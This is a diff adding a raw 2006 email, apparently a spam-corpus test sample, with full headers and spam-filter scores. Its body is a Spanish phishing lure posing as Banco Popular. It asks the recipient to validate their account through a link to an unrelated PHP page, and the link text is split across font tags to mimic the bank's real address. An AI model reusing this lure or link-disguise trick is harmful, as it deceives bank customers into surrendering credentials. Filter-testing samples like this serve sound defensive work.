@@ -1,0 +1,81 @@
+Return-Path: <nobody@lin1.host313.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP id 61830536E12
+	for <nobody@login.example.com>; Wed, 11 Jan 2006 11:58:55 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+	by mail2.example.com (Postfix) with ESMTP id 1BAFE6FA231
+	for <nobody@example.com>; Wed, 11 Jan 2006 11:58:51 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+	by mail2.example.com (Postfix) with ESMTP
+	for <nobody@example.com>; Wed, 11 Jan 2006 11:58:51 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+	id 033C01BC47; Wed, 11 Jan 2006 17:35:29 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+	by lujan.example.com (Postfix) with ESMTP id 58F9A1BB0C
+	for <foobee@example.com>; Wed, 11 Jan 2006 16:35:28 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+	by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+	with ESMTP id 01147-10 for <foobee@example.com>;
+	Wed, 11 Jan 2006 17:34:58 +0100 (CET)
+Received: from lin1.host313.com (lin1.host313.com [216.127.92.121])
+	by lujan.example.com (Postfix) with ESMTP id 964E91BC47
+	for <foobee@example.com>; Wed, 11 Jan 2006 17:33:42 +0100 (CET)
+Received: from nobody by lin1.host313.com with local (Exim 4.52)
+	id 1Ewiuf-0006uV-N2
+	for foobee@example.com; Thu, 12 Jan 2006 00:33:29 +0800
+To: foobee@example.com
+Subject: ¡63207 ALERTA CORREOS FALSOS!
+From: <info@bancopopular.es>
+Reply-To: info@bancopopular.es
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1Ewiuf-0006uV-N2@lin1.host313.com>
+Date: Thu, 12 Jan 2006 00:33:29 +0800
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - lin1.host313.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - lin1.host313.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Amavis-Alert: BAD HEADER Non-encoded 8-bit data (char A1 hex) in message header 'Subject'
+	Subject: \24163207 ALERTA CO... ^
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***
+X-Spam-Status: No, score=3.6 required=5.0 tests=HTML_10_20,HTML_MESSAGE,
+	HTML_MIME_NO_HTML_TAG,HTML_OBFUSCATE_10_20,MIME_HTML_ONLY,
+	NO_REAL_NAME,RAZOR2_CHECK,SUBJ_ALL_CAPS autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  0.0 NO_REAL_NAME From: does not include a real name
+	*  0.7 SUBJ_ALL_CAPS Subject is all capitals
+	*  0.9 HTML_OBFUSCATE_10_20 BODY: Message is 10% to 20% HTML obfuscation
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.2 HTML_10_20 BODY: Message is 10% to 20% HTML
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+	*  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 220
+
+¡Querido y apreciado foobee@example.com
+ usuario de Grupo Banco Popular!<br><br>
+Las entidades financieras del mundo entero y sus clientes siempre sufrian por 
+las tentativas de los criminales de recibir dinero por dolo. Hay varios modos
+ de efectuar dichas tentativas. (por ejemplo, falsificacion de tarjetas de 
+ credito, uso no autorizado de telefono o Internet)<br>
+En el marco de nuestro compromiso de prestar optimos 
+servicios ("Best Possible") a todos nuestros clientes, le rogamos
+ validar sus cuentas una vez al mes.<br>
+Para validar su cuenta bancaria personal online BANCO POPULAR,
+ siga el siguiente link: <a href="http://www.cadernomusical.com/uploads/r.php"><font>ht<font>tp</font><font>s://</font><font>www2.</font><font>bancopop</font><font>ular.es/Ap</font><font>pBPE/servle<font><font>t/servin?p_</font><font>pm=bo&p_pf</font>=c&p_id=esp</font></a>  <br>
+Estas medidas de seguridad son necesarias para proteger la integridad de su cuenta.<br>
+Presentamos nuestras excusas por las molestias que puedan causar dichas medidas. Estamos convencidos de que al fin y al cabo esta medida suplementaria de seguridad asegurara veinticuatro horas al dia la proteccion de sus cuentas
+
